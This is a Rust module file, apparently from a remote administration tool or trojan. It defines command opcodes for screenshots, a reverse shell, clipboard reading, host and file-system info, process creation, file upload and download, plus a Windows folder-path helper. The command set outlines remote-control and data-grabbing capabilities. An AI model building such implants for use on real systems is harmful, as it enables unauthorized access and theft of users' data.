use windirs;

pub mod protocol;
pub mod crypto;
pub mod connection_manager;
pub mod screen;


#[derive(Debug, Clone, Copy, PartialEq)]
#[repr(u8)]
pub enum CommandType {
    Screenshot = 0x61,
    ReverseShell = 0x63,
    HostOSInfo = 0x64,
    Clipboard = 0x65,
    FileSystemInfo = 0x66,
    Heartbeat = 0x68,
    CreateProcess = 0x69,
    Download = 0x70,
    Upload = 0x71,
    Unknow = 0xff,
}

impl CommandType {
    pub fn to_u8(&self) -> u8 {
        match self {
            CommandType::Screenshot => 0x61,
            CommandType::ReverseShell => 0x63,
            CommandType::HostOSInfo => 0x64,
            CommandType::Clipboard => 0x65,
            CommandType::FileSystemInfo => 0x66,
            CommandType::Heartbeat => 0x68,
            CommandType::CreateProcess => 0x69,
            CommandType::Download => 0x70,
            CommandType::Upload => 0x71,
            CommandType::Unknow => 0xff,
        }
    }

    pub fn from(value: u8) -> Self {
        match value {
            0x61 => CommandType::Screenshot,
            0x63 => CommandType::ReverseShell,
            0x64 => CommandType::HostOSInfo,
            0x65 => CommandType::Clipboard,
            0x66 => CommandType::FileSystemInfo,
            0x68 => CommandType::Heartbeat,
            0x69 => CommandType::CreateProcess,
            0x70 => CommandType::Download,
            0x71 => CommandType::Upload,
            _ => CommandType::Unknow,
        }
    }
}

pub fn get_known_folder_path(folder_id: windirs::FolderId, str: &str) -> String {
    windirs::known_folder_path(folder_id).unwrap().to_str().unwrap().to_owned() + "\\" + str
}

